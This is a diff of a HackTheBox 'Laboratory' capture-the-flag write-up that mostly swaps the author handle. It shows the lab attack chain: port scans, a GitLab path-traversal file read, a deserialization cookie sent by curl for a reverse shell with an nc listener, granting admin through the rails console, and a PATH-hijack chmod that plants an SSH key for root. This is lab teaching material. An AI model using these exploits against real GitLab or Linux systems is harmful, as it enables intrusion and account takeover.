@@ -7,16 +7,12 @@ permalink: /HackTheBox—Laboratory—Writeup/
 
 ---
 
-> Laboratory starts off with discovering an vulnerable GitLab instance running on the box. We'll refer an HackerOne report to exploit a CVE associated with it to get Arbitrary file read vulnerability and chain it to get obtain Remote Code execution on the GitLab container. Next we make use of Gitlab rails console to manipulate active user data and gain access to admin's private repository, where we discover an SSH key. For escalating privileges to root we exploit a SUID binary which doesn't call `chmod` binary from it's absolute path, we forge an malicious chmod binary, update the PATH which results it to run as root.
-
-## Reconnaissance
-
 ### masscan
 
 Initial Port scanning using `masscan` and `nmap` :
 
 ```shell
-cfx:  ~/Documents/htb/laboratory
+spy0x7:  ~/Documents/htb/laboratory
 → masscan -e tun0 -p1-65535 --rate 500 10.10.10.216 | tee masscan.ports
 
 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-15 19:08:30 GMT
@@ -31,7 +27,7 @@ Discovered open port 443/tcp on 10.10.10.216
 ### nmap
 
 ```shel
-cfx:  ~/Documents/htb/laboratory
+spy0x7:  ~/Documents/htb/laboratory
 → nmap -sC -sV -p22,80,443 10.10.10.216
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 01:24 IST
 Nmap scan report for laboratory.htb (10.10.10.216)
@@ -87,7 +83,7 @@ At `git.laboratory.htb` we find an instance of GitLab community edition
 
 Since we don't have any creds or usernames associated with this box yet, we will use the `Register` functionality to register ourselves an account.
 
-The Register functionality seems to accept registrations with email domain `laboratory.htb` hence we use `cfx@laboratory.htb`
+The Register functionality seems to accept registrations with email domain `laboratory.htb` hence we use `spy0x7@laboratory.htb`
 
 ![register](/assets/Laboratory/register.png)
 
@@ -140,7 +136,7 @@ Step 4 : We'll find the file linked to the second project issue :
 Clicking on it downloads the file:
 
 ```shell
-cfx:  ~/Documents/htb/laboratory
+spy0x7:  ~/Documents/htb/laboratory
 → cat passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -169,7 +165,7 @@ To administer RCE attack first we need to grab `/opt/gitlab/embedded/service/git
 `![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)`
 
 ```yml
-cfx:  ~/Documents/htb/laboratory
+spy0x7:  ~/Documents/htb/laboratory
 → cat secrets.yml
 # This file is managed by gitlab-ctl. Manual changes will be
 # erased! To change the contents below, edit /etc/gitlab/gitlab.rb
@@ -204,12 +200,12 @@ Next, to build the Deserialization payload we need to spin off a replica of vuln
 It will take few mins to run the container to start, in a new terminal we can check the docker process and simultaneously get a shell on it.
 
 ```shell
-cfx:  ~/Documents/htb/laboratory
+spy0x7:  ~/Documents/htb/laboratory
 → docker ps
 CONTAINER ID        IMAGE                          COMMAND             CREATED             STATUS                             PORTS                     NAMES
 55c5745c3e56        gitlab/gitlab-ce:12.8.1-ce.0   "/assets/wrapper"   29 seconds ago      Up 24 seconds (health: starting)   22/tcp, 80/tcp, 443/tcp   friendly_volhard
 
-cfx:  ~/Documents/htb/laboratory
+spy0x7:  ~/Documents/htb/laboratory
 → docker exec -it friendly_volhard /bin/bash
 
 root@55c5745c3e56:/# ls
@@ -316,7 +312,7 @@ Step 5 : Execution
 Now that we have the cookie value ready we will run the `curl` command to drop us a reverse shell:
 
 ```shell
-cfx:  ~/Documents/htb/laboratory
+spy0x7:  ~/Documents/htb/laboratory
 → curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvO
 kBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5
 jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kibiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48P
@@ -331,7 +327,7 @@ Make sure to start the webserver and nc listener before executing the curl comma
 ![shell](/assets/Laboratory/shell.png)
 
 ```shell
-cfx:  ~/Documents/htb/laboratory
+spy0x7:  ~/Documents/htb/laboratory
 → nc -lvnp 4444
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
@@ -397,14 +393,14 @@ git@git:~$ gitlab-rails console
 Loading production environment (Rails 6.0.2)
 irb(main):001:0> User.active
 User.active
-=> #<ActiveRecord::Relation [#<User id:4 @seven>, #<User id:1 @dexter>, #<User id:5 @tuser>, #<User id:6 @cfx>]>
+=> #<ActiveRecord::Relation [#<User id:4 @seven>, #<User id:1 @dexter>, #<User id:5 @tuser>, #<User id:6 @spy0x7>]>
 irb(main):002:0> User.admins
 User.admins
 => #<ActiveRecord::Relation [#<User id:1 @dexter>]>
-irb(main):003:0> cfx.admin = true
-cfx.admin = true
-irb(main):004:0> cfx.save
-cfx.save
+irb(main):003:0> spy0x7.admin = true
+spy0x7.admin = true
+irb(main):004:0> spy0x7.save
+spy0x7.save
 => true
 ```
 ![adm](/assets/Laboratory/adm.png)
@@ -460,7 +456,7 @@ But what's more interesting is that folder dexter contains an `.ssh` folder with
 Using this key we can SSH as dexter:
 
 ```shell
-cfx:  ~/Documents/htb/laboratory
+spy0x7:  ~/Documents/htb/laboratory
 → ssh -i id_rsa dexter@10.10.10.216
 dexter@laboratory:~$ id
 uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)
@@ -547,11 +543,11 @@ dexter@laboratory:~$ echo $PATH
 
 So we can forge `chmod` of our own, update the path and confuse the application execute our `chmod`
 
-I'll create a ssh key using `ssh-keygen -f cfx`:
+I'll create a ssh key using `ssh-keygen -f spy0x7`:
 
 ```shell
 dexter@laboratory:/tmp$ cat chmod
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFJ4KUY9Dzy4UKYRwT+ORSIGW1W2YSKQrqIlNfRksWqWOz3bCJCE5gImrgx/lsL/kItrEvy9js4nQ1zmUrJ6kSYU7[..SNIP..]Rws4b8UeKpU+ft6Uk root@cfx" > /root/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFJ4KUY9Dzy4UKYRwT+ORSIGW1W2YSKQrqIlNfRksWqWOz3bCJCE5gImrgx/lsL/kItrEvy9js4nQ1zmUrJ6kSYU7[..SNIP..]Rws4b8UeKpU+ft6Uk root@spy0x7" > /root/.ssh/authorized_keys
 
 dexter@laboratory:/tmp$ chmod +x chmod
 dexter@laboratory:/tmp$ export PATH=/tmp:$PATH
@@ -575,8 +571,8 @@ This should have successfully copied our public ssh key to `/root/.ssh/authorize
 ### SSH - root
 
 ```shell
-cfx:  ~/Documents/htb/docker
-→ ssh -i cfx root@10.10.10.216
+spy0x7:  ~/Documents/htb/docker
+→ ssh -i spy0x7 root@10.10.10.216
 root@laboratory:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@laboratory:~# whoami
